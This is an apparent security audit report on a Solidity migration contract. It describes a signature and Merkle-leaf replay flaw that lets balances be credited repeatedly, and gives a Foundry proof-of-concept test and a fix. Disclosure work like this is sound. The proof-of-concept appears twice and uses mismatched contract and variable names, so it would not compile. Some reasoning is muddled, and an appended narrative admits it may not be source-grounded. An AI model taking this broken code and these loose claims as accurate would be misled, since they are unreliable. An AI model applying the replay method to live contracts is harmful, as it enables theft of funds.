---
id: 3539
severity: "High"
---

# Successful transactions are not stored, causing a replay attack on ``redeemDepositsAndInternalBalances``

## Description

in redeemDepositsAndInternalBalances there is no validation about the parameters that have been used which should be stored and should not be reused.

As a result, parameters that have already been used can be reused.

Look at this:

```solidity
function redeemDepositsAndInternalBalances(
        address owner,
        address reciever,
        AccountDepositData[] calldata deposits,
        AccountInternalBalance[] calldata internalBalances,
        uint256 ownerRoots,
        bytes32[] calldata proof,
        uint256 deadline,
        bytes calldata signature
    ) external payable fundsSafu noSupplyChange nonReentrant {
        // verify deposits are valid.
        // note: if the number of contracts that own deposits is small,
        // deposits can be stored in bytecode rather than relying on a merkle tree.
        verifyDepositsAndInternalBalances(owner, deposits, internalBalances, ownerRoots, proof);

        // signature verification.
        verifySignature(owner, reciever, deadline, signature)
```

```solidity
function verifyDepositsAndInternalBalances(
        address account,
        AccountDepositData[] calldata deposits,
        AccountInternalBalance[] calldata internalBalances,
        uint256 ownerRoots,
        bytes32[] calldata proof
    ) internal pure {
        bytes32 leaf = keccak256(abi.encode(account, deposits, internalBalances, ownerRoots));
        require(MerkleProof.verify(proof, MERKLE_ROOT, leaf), "Migration: invalid proof");
    }
```

```solidity
function verifySignature(
        address owner,
        address reciever,
        uint256 deadline,
        bytes calldata signature
    ) internal view {
        require(block.timestamp <= deadline, "Migration: permit expired deadline");
        bytes32 structHash = keccak256(
            abi.encode(REDEEMDEPOSITTYPE_HASH, owner, reciever, deadline)
        );

        bytes32 hash = _hashTypedDataV4(structHash);
        address signer = ECDSA.recover(hash, signature);
        require(signer == owner, "Migration: permit invalid signature");
    }
```

In verifyDepositsAndInternalBalances, leaf is not stored, and there are no checks to ensure that leaf is only used once.

This means that parameters that have been filled in verifyDepositsAndInternalBalances and succeeded, can be reused.

And verifySignature also has no checks to ensure that the signature is only used once.

verifySignature prevents replay attacks by relying solely on deadline, which is bad.

See this:
require(block.timestamp <= deadline, "Migration: permission deadline expired");

So, deadline is always greater than block.timestamp for success.

Even if block.timestamp reaches the deadline or is smaller than block.timestamp, the owner can sign again to execute a replay attack. This is because verifyDepositsAndInternalBalances does not prevent replay attacks and there is no access control on redeemDepositsAndInternalBalances.

The vulnerabilities present in the verifyDepositAndInternalBalance and verifySignature functions make replay attacks unavoidable.

POC
Due to difficulty finding the same MERKLE_ROOT value as the L2ContractMigrationFacet contract.

So, this PoC only proved a simple signature replay of L2ContractMigrationFacet.

Then the bug in verifyDepositsAndInternalBalances can be proven by yourself with a replay attack scheme, since only you know the "leaves" of MERKLE_ROOT in the L2ContractMigrationFacet contract.
paste this code on dir/test of new foundry project
don't forget to install dependencies such as forge-std and openzeppelin
run with forge test -vvvv

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract PocTest is Test {
    using ECDSA for bytes32;

    L2ContractMigrationFacetsimple L2CMFOp;

    uint256 internal signerPrivateKey;

    uint256 optimismFork;

    bytes32 private constant REDEEMDEPOSITTYPE_HASH =
        keccak256(
            "redeemDepositsAndInternalBalances(address owner,address reciever,uint256 deadline)"
        );

    function setUp() public {
        optimismFork = vm.createSelectFork("https://rpc.ankr.com/optimism", 122288540);
        L2CMFOp = new L2ContractMigrationFacetsimple();
    }

    function testpocreplay_attack() public {
        vm.selectFork(optimismFork);
        signerPrivateKey = 0xabc123;
        address signer = vm.addr(signerPrivateKey);
        address owner = signer;
        address reciever = makeAddr("reciever");
        uint256 deadline = block.timestamp + 7 days;

        bytes32 structHash = keccak256(
            abi.encode(REDEEMDEPOSITTYPE_HASH, owner, reciever, deadline)
        );
        vm.startPrank(signer);
        bytes32 hash = L2CMFOp.hashTypedDataV4(structHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, hash);
        bytes memory signature = abi.encodePacked(r, s, v);
        L2CMF_Op.redeemDepositsAndInternalBalances(owner, reciever, deadline, signature);
        
        console.log("..Replay attack");
        vm.warp(block.timestamp + 4200);
        L2CMF_Op.redeemDepositsAndInternalBalances(owner, reciever, deadline, signature);
    }
}

contract L2ContractMigrationFacet_simple is ReentrancyGuard {
    bytes32 private constant MIGRATIONHASHEDNAME =
        keccak256(bytes("Migration"));
    bytes32 private constant MIGRATIONHASHEDVERSION = keccak256(bytes("1"));
    bytes32 private constant EIP712TYPEHASH =
        keccak256(
            "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
        );
    bytes32 private constant REDEEMDEPOSITTYPE_HASH =
        keccak256(
            "redeemDepositsAndInternalBalances(address owner,address reciever,uint256 deadline)"
        );

    function redeemDepositsAndInternalBalances(
        address owner,
        address reciever,
        uint256 deadline,
        bytes calldata signature
    ) external payable nonReentrant {
        verifySignature(owner, reciever, deadline, signature);
    }

    function verifySignature(
        address owner,
        address reciever,
        uint256 deadline,
        bytes calldata signature
    ) internal view {
        require(
            block.timestamp <= deadline,
            "Migration: permit expired deadline"
        );
        bytes32 structHash = keccak256(
            abi.encode(REDEEMDEPOSITTYPE_HASH, owner, reciever, deadline)
        );

        bytes32 hash = _hashTypedDataV4(structHash);
        address signer = ECDSA.recover(hash, signature);
        require(signer == owner, "Migration: permit invalid signature");
    }

    function _hashTypedDataV4(
        bytes32 structHash
    ) public view returns (bytes32) {
        return
            keccak256(
                abi.encodePacked("\x19\x01", _domainSeparatorV4(), structHash)
            );
    }

    /**
     * @notice Returns the domain separator for the current chain.
     */
    function _domainSeparatorV4() internal view returns (bytes32) {
        return
            keccak256(
                abi.encode(
                    EIP712TYPEHASH,
                    MIGRATIONHASHEDNAME,
                    MIGRATIONHASHEDVERSION,
                    1, // C.getLegacyChainId()
                    address(this)
                )
            );
    }
}
```

look at this code:

```solidity
        uint256 accountStalk;
        for (uint256 i; i < deposits.length; i++) {
            accountStalk += addMigratedDepositsToAccount(reciever, deposits[i]);
        }

        // set stalk for account.
        setStalk(reciever, accountStalk, ownerRoots);
///////////////////////////////////////////////////////

function setStalk(address account, uint256 accountStalk, uint256 accountRoots) internal {
        s.accts[account].stalk += accountStalk;
        s.accts[account].roots += accountRoots;

        // emit event.
        emit StalkBalanceChanged(account, int256(accountStalk), int256(accountRoots));
    }
```

Attacker can perform replay attack and increase of value of stalk and roots

## Proof of Concept

Due to difficulty finding the same MERKLE_ROOT value as the L2ContractMigrationFacet contract.

So, this PoC only proved a simple signature replay of L2ContractMigrationFacet.

Then the bug in verifyDepositsAndInternalBalances can be proven by yourself with a replay attack scheme, since only you know the "leaves" of MERKLE_ROOT in the L2ContractMigrationFacet contract.
paste this code on dir/test of new foundry project
don't forget to install dependencies such as forge-std and openzeppelin
run with forge test -vvvv

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract PocTest is Test {
    using ECDSA for bytes32;

    L2ContractMigrationFacetsimple L2CMFOp;

    uint256 internal signerPrivateKey;

    uint256 optimismFork;

    bytes32 private constant REDEEMDEPOSITTYPE_HASH =
        keccak256(
            "redeemDepositsAndInternalBalances(address owner,address reciever,uint256 deadline)"
        );

    function setUp() public {
        optimismFork = vm.createSelectFork("https://rpc.ankr.com/optimism", 122288540);
        L2CMFOp = new L2ContractMigrationFacetsimple();
    }

    function testpocreplay_attack() public {
        vm.selectFork(optimismFork);
        signerPrivateKey = 0xabc123;
        address signer = vm.addr(signerPrivateKey);
        address owner = signer;
        address reciever = makeAddr("reciever");
        uint256 deadline = block.timestamp + 7 days;

        bytes32 structHash = keccak256(
            abi.encode(REDEEMDEPOSITTYPE_HASH, owner, reciever, deadline)
        );
        vm.startPrank(signer);
        bytes32 hash = L2CMFOp.hashTypedDataV4(structHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, hash);
        bytes memory signature = abi.encodePacked(r, s, v);
        L2CMF_Op.redeemDepositsAndInternalBalances(owner, reciever, deadline, signature);
        
        console.log("..Replay attack");
        vm.warp(block.timestamp + 4200);
        L2CMF_Op.redeemDepositsAndInternalBalances(owner, reciever, deadline, signature);
    }
}

contract L2ContractMigrationFacet_simple is ReentrancyGuard {
    bytes32 private constant MIGRATIONHASHEDNAME =
        keccak256(bytes("Migration"));
    bytes32 private constant MIGRATIONHASHEDVERSION = keccak256(bytes("1"));
    bytes32 private constant EIP712TYPEHASH =
        keccak256(
            "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
        );
    bytes32 private constant REDEEMDEPOSITTYPE_HASH =
        keccak256(
            "redeemDepositsAndInternalBalances(address owner,address reciever,uint256 deadline)"
        );

    function redeemDepositsAndInternalBalances(
        address owner,
        address reciever,
        uint256 deadline,
        bytes calldata signature
    ) external payable nonReentrant {
        verifySignature(owner, reciever, deadline, signature);
    }

    function verifySignature(
        address owner,
        address reciever,
        uint256 deadline,
        bytes calldata signature
    ) internal view {
        require(
            block.timestamp <= deadline,
            "Migration: permit expired deadline"
        );
        bytes32 structHash = keccak256(
            abi.encode(REDEEMDEPOSITTYPE_HASH, owner, reciever, deadline)
        );

        bytes32 hash = _hashTypedDataV4(structHash);
        address signer = ECDSA.recover(hash, signature);
        require(signer == owner, "Migration: permit invalid signature");
    }

    function _hashTypedDataV4(
        bytes32 structHash
    ) public view returns (bytes32) {
        return
            keccak256(
                abi.encodePacked("\x19\x01", _domainSeparatorV4(), structHash)
            );
    }

    /**
     * @notice Returns the domain separator for the current chain.
     */
    function _domainSeparatorV4() internal view returns (bytes32) {
        return
            keccak256(
                abi.encode(
                    EIP712TYPEHASH,
                    MIGRATIONHASHEDNAME,
                    MIGRATIONHASHEDVERSION,
                    1, // C.getLegacyChainId()
                    address(this)
                )
            );
    }
}
```

## Recommendation

```solidity
    mapping(bytes32 => bool) public isRedeemed;

    function verifyDepositsAndInternalBalances(
        address account,
        AccountDepositData[] calldata deposits,
        AccountInternalBalance[] calldata internalBalances,
        uint256 ownerRoots,
        bytes32[] calldata proof
    ) internal {
        bytes32 leaf = keccak256(abi.encode(account, deposits, internalBalances, ownerRoots));
        if (isRedeemed[leaf]) revert REDEEMED_ALREADY();
        require(MerkleProof.verify(proof, MERKLE_ROOT, leaf), "Migration: invalid proof");
        isRedeemed[leaf] = true;
    }
```

And also do that in verifySignature ensure that can't be front running attack, like add access control or nonces

## Derived Narrative

The following field is derived content and may not be source-grounded:

The contract function redeemDepositsAndInternalBalances is intended to move deposited assets and internal balances from one account to another after verifying a Merkle proof and an EIP‑712 signature. However, the implementation never records that a particular set of parameters (the Merkle leaf and the signed permit) has already been processed. The leaf, which is the hash of the account address, the deposit array, the internal balance array and the ownerRoots value, is computed inside verifyDepositsAndInternalBalances but is not stored, and no mapping is consulted to reject a second use. Likewise, verifySignature only checks that the current block timestamp is before the supplied deadline and that the recovered signer matches the owner; it does not mark the signature as consumed nor enforce a nonce. Because of these omissions, an attacker who possesses a valid signature and the corresponding Merkle proof can call redeemDepositsAndInternalBalances multiple times with the same arguments before the deadline expires. Each replay call executes the internal accounting logic that adds the deposited stalk and root values to the receiver’s account, effectively inflating the receiver’s balance each time. From a user’s perspective the protocol appears to credit extra stalk or root tokens without any corresponding deposit, which violates the accounting invariants of the system and can lead to uncontrolled token minting or loss of value for other participants. The vulnerability manifests whenever a legitimate user signs a permit for a migration or redemption operation; the signed data can be reused by the signer or any party that obtains the signature, because there is no replay protection. The issue was discovered during a manual audit that examined the flow of data through the verification functions and confirmed the problem with a Foundry test that performed a signature replay after advancing the block timestamp. The bug is subtle because the contract does perform cryptographic verification and deadline checks, giving a false sense of security, while the missing state‑based replay guard is easy to overlook. To remediate the flaw the contract should record each processed leaf (for example, using a mapping(bytes32=>bool) isRedeemed) and reject any subsequent call with the same leaf, and it should also track used signatures or introduce a per‑owner nonce or access‑control mechanism so that a permit cannot be replayed after it has been consumed. This change restores the one‑time nature of the migration operation and prevents unauthorized balance inflation.
